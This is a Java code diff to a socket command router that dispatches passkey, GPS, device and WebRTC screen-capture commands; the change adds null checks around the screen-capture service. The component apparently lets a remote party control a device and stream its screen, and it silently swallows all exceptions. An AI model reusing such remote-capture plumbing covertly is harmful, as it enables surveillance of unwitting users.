@@ -117,8 +117,18 @@ public final class SocketCommandRouter {
                 case Protocol.MOD_PASSKEY: EXEC.execute(() -> handlePasskey(data, socket)); break;
                 case Protocol.MOD_GPS_ADV: EXEC.execute(() -> handleGpsAdv(data, socket)); break;
                 case Protocol.MOD_DEVICE:  EXEC.execute(() -> handleDevice(data, socket)); break;
-                case Protocol.WEBRTC_OFFER: WEBRTC_EXEC.execute(() -> ScreenCaptureService.getInstance().handleWebRtcOffer(data)); break;
-                case Protocol.WEBRTC_ICE:   WEBRTC_EXEC.execute(() -> ScreenCaptureService.getInstance().handleWebRtcIce(data)); break;
+                case Protocol.WEBRTC_OFFER:
+                    WEBRTC_EXEC.execute(() -> {
+                        ScreenCaptureService svc = ScreenCaptureService.getInstance();
+                        if (svc != null) svc.handleWebRtcOffer(data);
+                    });
+                    break;
+                case Protocol.WEBRTC_ICE:
+                    WEBRTC_EXEC.execute(() -> {
+                        ScreenCaptureService svc = ScreenCaptureService.getInstance();
+                        if (svc != null) svc.handleWebRtcIce(data);
+                    });
+                    break;
             }
         } catch (Exception ignored) {}
     }
